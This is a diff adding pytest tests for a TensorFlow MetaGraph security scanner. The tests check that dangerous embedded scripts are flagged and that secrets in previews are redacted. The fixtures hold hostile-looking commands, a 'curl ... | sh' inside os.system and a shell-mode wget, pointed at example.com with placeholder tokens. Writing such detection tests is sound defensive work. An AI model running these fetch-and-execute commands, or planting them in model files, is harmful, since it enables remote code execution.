@@ -1,6 +1,7 @@
 from __future__ import annotations
 
 import importlib
+import json
 import os
 from pathlib import Path
 from typing import Any, cast
@@ -470,6 +471,61 @@ def test_tf_metagraph_scanner_detects_unsafe_ops_and_executable_payload_signals(
         "Multiple independent executable-context risk indicators detected in MetaGraph" in issue.message
         for issue in result.issues
     )
+
+
+def test_tf_metagraph_scanner_redacts_sensitive_previews_and_examples(tmp_path: Path) -> None:
+    sensitive_url = "https://example.com/p.sh?X-Amz-Signature=SECRET123&safe=1"
+    sensitive_command = f"python -c \"import os; os.system('curl {sensitive_url} | sh')\" client_secret=supersecret"
+    sensitive_meta = tmp_path / "sensitive-preview.meta"
+    sensitive_meta.write_bytes(
+        _build_metagraph(
+            graph_nodes=[
+                {
+                    "name": "pyfunc_node",
+                    "op": "PyFunc",
+                    "attrs": {
+                        "script": sensitive_command,
+                        "library_path": "s3://bucket/model.so?token=rawtoken",
+                    },
+                }
+            ],
+            collection_bytes={"runtime_hook": [sensitive_command.encode("utf-8")]},
+        )
+    )
+
+    result = TensorFlowMetaGraphScanner().scan(str(sensitive_meta))
+    serialized_details = json.dumps([check.details for check in result.checks], sort_keys=True)
+
+    assert "SECRET123" not in serialized_details
+    assert "supersecret" not in serialized_details
+    assert "rawtoken" not in serialized_details
+    assert "X-Amz-Signature=<redacted>" in serialized_details
+    assert "client_secret=<redacted>" in serialized_details
+    assert "token=<redacted>" in serialized_details
+    assert "os.system" in serialized_details
+    assert "example.com/p.sh" in serialized_details
+
+
+def test_tf_metagraph_scanner_preserves_benign_public_preview_context(tmp_path: Path) -> None:
+    public_url = "https://example.com/p.sh?variant=public"
+    public_meta = tmp_path / "public-preview.meta"
+    public_meta.write_bytes(
+        _build_metagraph(
+            graph_nodes=[
+                {
+                    "name": "pyfunc_node",
+                    "op": "PyFunc",
+                    "attrs": {"script": f"subprocess.run('wget {public_url}', shell=True)"},
+                }
+            ]
+        )
+    )
+
+    result = TensorFlowMetaGraphScanner().scan(str(public_meta))
+    executable_checks = [check for check in result.checks if check.name == "MetaGraph Executable String Check"]
+
+    assert len(executable_checks) == 1
+    assert executable_checks[0].details["value_preview"] == f"subprocess.run('wget {public_url}', shell=True)"
 
 
 def test_tf_metagraph_scanner_inspects_collection_payload_through_collection_limit(tmp_path: Path) -> None:
